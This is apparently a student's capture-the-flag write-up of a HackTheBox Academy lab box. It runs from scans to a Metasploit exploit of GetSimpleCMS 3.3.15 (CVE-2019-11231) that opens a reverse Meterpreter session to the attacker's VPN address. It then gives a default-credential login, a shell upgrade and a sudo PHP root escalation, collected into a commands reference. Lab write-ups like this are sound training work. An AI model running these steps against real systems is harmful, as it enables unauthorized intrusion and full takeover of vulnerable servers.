└─$ sudo nmap -sV -sC -p- -T4 10.129.58.151
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-18 17:08 -0500
Stats: 0:12:47 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 93.75% done; ETC: 17:21 (0:00:00 remaining)
Nmap scan report for 10.129.58.151
Host is up (0.12s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4c:73:a0:25:f5:fe:81:7b:82:2b:36:49:a5:4d:c8:5e (RSA)
|   256 e1:c0:56:d0:52:04:2f:3c:ac:9a:e7:b1:79:2b:bb:13 (ECDSA)
|_  256 52:31:47:14:0d:c3:8e:15:73:e3:c4:24:a2:3a:12:77 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/admin/
|_http-title: Welcome to GetSimple! - gettingstarted
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

WHATWEB

──(kali㉿kali)-[~]
└─$ whatweb -a 3 http://10.129.58.151
http://10.129.58.151 [200 OK] AddThis, Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.58.151], Script[text/javascript], Title[Welcome to GetSimple! - gettingstarted]

GOBUSTER
└─$ gobuster dir -u http://10.129.58.151 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.58.151
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
data                 (Status: 301) [Size: 313] [--> http://10.129.58.151/data/]
admin                (Status: 301) [Size: 314] [--> http://10.129.58.151/admin/]
plugins              (Status: 301) [Size: 316] [--> http://10.129.58.151/plugins/]
theme                (Status: 301) [Size: 314] [--> http://10.129.58.151/theme/]
backups              (Status: 301) [Size: 316] [--> http://10.129.58.151/backups/]
Progress: 55827 / 220558 (25.31%)^C



![[Pasted image 20260118232842.png]]


admin admin credentials

![[Pasted image 20260118233825.png]]

# Getting Started - Knowledge Check

## Box Information

| Property | Value |
|----------|-------|
| **Platform** | HackTheBox Academy |
| **Module** | Getting Started |
| **Difficulty** | Easy |
| **OS** | Linux (Ubuntu 5.4.0-65-generic) |
| **Hostname** | gettingstarted |
| **IP Address** | 10.129.58.151 |
| **My VPN IP** | 10.10.16.25 (tun1) |
| **Date Completed** | 18-01-2026 |
| **Time Spent** | ~2 hours (solo!) |
| **Status** | ✅ ROOTED |

---

## Flags

| Flag | Hash |
|------|------|
| **User** | `----------` |
| **Root** | `----------` |

---

## Reconnaissance

### Nmap Scan
```bash
nmap -sV -sC 10.129.58.151
```

**Open Ports:**
- Port 80: HTTP (Apache)
- Port 22: SSH (OpenSSH)

### Web Enumeration

**Homepage:**
- GetSimpleCMS installation
- Version: 3.3.15

**Admin Panel:**
- Location: `/admin/`
- Credentials: `admin:admin` (default)

---

## Initial Access - Method 1: Metasploit ✅

### Vulnerability

**CVE:** CVE-2019-11231  
**Title:** GetSimpleCMS 3.3.15 Unauthenticated RCE  
**Exploit:** `exploit/multi/http/getsimplecms_unauth_code_exec`

### Exploitation Steps
```bash
# Start Metasploit
msfconsole

# Search for exploit
search getsimple

# Use module 1 (unauthenticated)
use 1

# Configure options
set RHOSTS 10.129.58.151
set LHOST 10.10.16.25
set TARGETURI /

# Exploit
run
```

### Result
```
[*] Meterpreter session 1 opened
Server username: www-data
```

**Initial shell:** `www-data` user

---

## Shell Upgrade
```bash
# From Meterpreter
shell

# Spawn TTY
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

**Upgraded shell:**
```
www-data@gettingstarted:/var/www/html/theme$
```

---

## User Flag

### Discovery
```bash
# List home directories
ls -la /home/

# Found user: mrb3n
ls -la /home/mrb3n/

# Read flag
cat /home/mrb3n/user.txt
```

**User Flag:** `------------------` ✅

---

## Privilege Escalation - Method 1 ✅

### Enumeration
```bash
sudo -l
```

**Output:**
```
User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php
```

### Technique: GTFOBins - Sudo PHP

**Vulnerability:** `www-data` can run PHP as root without password

### Exploitation
```bash
sudo php -r "system('/bin/bash');"
```

**Result:**
```
root@gettingstarted:/var/www/html/theme#
```

**Root shell achieved!** 🔥

---

## Root Flag
```bash
cat /root/root.txt
```

**Root Flag:** `---------------` ✅

---

## Lessons Learned

### Critical Discoveries

1. **VPN Routing Check**
   - Always use `ip route get [TARGET_IP]` before setting LHOST
   - Correct VPN interface is crucial for reverse shells

2. **Sudo Privileges**
   - `sudo -l` should always be first enumeration step
   - GTFOBins is invaluable for privilege escalation

3. **Default Credentials**
   - Always test common credentials (admin:admin)
   - Many applications have weak defaults

### Technical Skills Applied

- ✅ Nmap enumeration
- ✅ Web application fingerprinting
- ✅ Metasploit exploitation
- ✅ Shell upgrading (Python PTY)
- ✅ Linux privilege escalation
- ✅ GTFOBins usage

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning & service enumeration |
| Metasploit | Exploitation framework |
| Netcat | Reverse shell listener (if manual) |
| Python3 | Shell upgrade |
| GTFOBins | Privilege escalation reference |

---

## Commands Reference

### Enumeration
```bash
nmap -sV -sC [TARGET_IP]
ip route get [TARGET_IP]
```

### Metasploit
```bash
msfconsole
search getsimple
use exploit/multi/http/getsimplecms_unauth_code_exec
set RHOSTS [TARGET_IP]
set LHOST [YOUR_VPN_IP]
set TARGETURI /
run
```

### Shell Upgrade
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

### Privilege Escalation
```bash
sudo -l
sudo php -r "system('/bin/bash');"
```

---

## Attack Chain Summary
```
1. Nmap Scan → Port 80 (HTTP)
2. Web Enum → GetSimpleCMS 3.3.15
3. Searchsploit → CVE-2019-11231
4. Metasploit → www-data shell
5. sudo -l → PHP executable as root
6. GTFOBins → Root shell
7. Flags captured ✅
```

---

## Notes

### What Went Well
- Quick enumeration and exploitation
- Remembered to check VPN routing first (learned from Nibbles!)
- Systematic privilege escalation approach
- Clean execution from start to finish

### Areas for Improvement
- Should try manual method next time
- Find alternative privilege escalation routes
- Take more screenshots during exploitation
- Document in real-time instead of after

### Next Steps
- [ ] Try manual exploitation method
- [ ] Find second privilege escalation route
- [ ] Complete more Easy boxes
- [ ] Practice without Metasploit

---

## Related Notes

- [[Nibbles Box]]
- [[HTB Getting Started Module]]
- [[GTFOBins Reference]]
- [[Metasploit Basics]]
- [[VPN Troubleshooting]]

---

## Achievement

🎉 **First Solo Box - Completed Without Walkthrough!** 🎉

**HTB Response:** "Great job leonwintweer!"

---

*Last updated: 2026-01-18*
